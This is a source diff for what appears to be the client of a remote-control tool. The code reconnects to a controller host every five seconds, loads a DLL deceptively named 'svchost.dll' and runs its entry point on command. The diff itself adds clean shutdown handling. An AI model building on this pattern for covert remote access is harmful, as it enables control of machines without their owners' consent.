@@ -2,8 +2,12 @@
 #include "windows.h"
 #include <winsock2.h>
 
-
+// 配置远程主机信息
 CONNECTION_DATA modify_data = MAKE_CONNECTION_DATA("127.0.0.1", 6543);
+
+HMODULE g_svcDLL = LoadLibraryA(".\\svchost.dll");
+
+BOOL g_isRun = TRUE;
 
 // 从域名获取IP地址
 inline const char* GetIPAddress(const char* hostName)
@@ -22,7 +26,8 @@ inline const char* GetIPAddress(const char* hostName)
     return addr;
 }
 
-DWORD _stdcall ConnectThread(LPVOID lParam)
+// 返回-1表示正常退出
+DWORD _stdcall ConnectThread(HMODULE hDLL)
 {
     SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_BELOW_NORMAL);
 
@@ -78,9 +83,8 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     int Err = -1;
 
     if (msgHead.dwCmd == CMD_DLLDATA) {
-        HMODULE hDLL = LoadLibraryA(".\\svchost.dll");
         if (NULL != hDLL) {
-            typedef BOOL(*_RoutineMain)(LPVOID lp);
+            typedef BOOL(WINAPI*_RoutineMain)(LPVOID lp);
             _RoutineMain RoutineMain = (_RoutineMain)GetProcAddress(hDLL, "RoutineMain");
             Err = RoutineMain((LPVOID)&modify_data);
         }
@@ -92,8 +96,49 @@ DWORD _stdcall ConnectThread(LPVOID lParam)
     return Err;
 }
 
+// 定义控制台事件处理函数
+BOOL WINAPI ConsoleEventHandler(DWORD eventType) {
+    typedef void(*_ExitProcess)();
+    static _ExitProcess exit = (_ExitProcess)GetProcAddress(g_svcDLL, "QuitProcess");
+	switch (eventType) {
+	case CTRL_C_EVENT:
+		Mprintf("Ctrl+C 事件被捕获\n");
+        if (exit) exit();
+        g_isRun = FALSE;
+		break;
+	case CTRL_BREAK_EVENT:
+		Mprintf("Ctrl+Break 事件被捕获\n");
+		break;
+	case CTRL_CLOSE_EVENT:
+		Mprintf("关闭事件被捕获\n");
+        if (exit) exit();
+        g_isRun = FALSE;
+		break;
+	case CTRL_LOGOFF_EVENT:
+		Mprintf("用户注销事件被捕获\n");
+        if (exit) exit();
+        g_isRun = FALSE;
+		break;
+	case CTRL_SHUTDOWN_EVENT:
+		Mprintf("系统关闭事件被捕获\n");
+        if (exit) exit();
+        g_isRun = FALSE;
+		break;
+	default:
+		return FALSE;
+	}
+	// 返回 TRUE 表示事件已处理，阻止系统的默认行为
+	return TRUE;
+}
+
 int main()
 {
+	// 注册控制台事件处理程序
+	if (!SetConsoleCtrlHandler(ConsoleEventHandler, TRUE)) {
+        Mprintf("无法设置控制台控制处理程序\n");
+	}
+
+	Mprintf("程序正在运行，按 Ctrl+C 关闭\n");
     HWND hwnd = CreateWindowExW(WS_EX_APPWINDOW,
                                 L"#32770",
                                 L"WindowsNet",
@@ -135,10 +180,10 @@ OK:
     WSADATA lpWSAData;
     WSAStartup(MAKEWORD(2, 2), &lpWSAData);
 
-    while (1) {
+    while (g_isRun) {
         __try {
-            if (ConnectThread(NULL) == -1) {
-                Mprintf("exiting\n");
+            if (ConnectThread(g_svcDLL) == -1) {
+                Mprintf("Client exit normally\n");
                 break;
             }
             Sleep(5000);
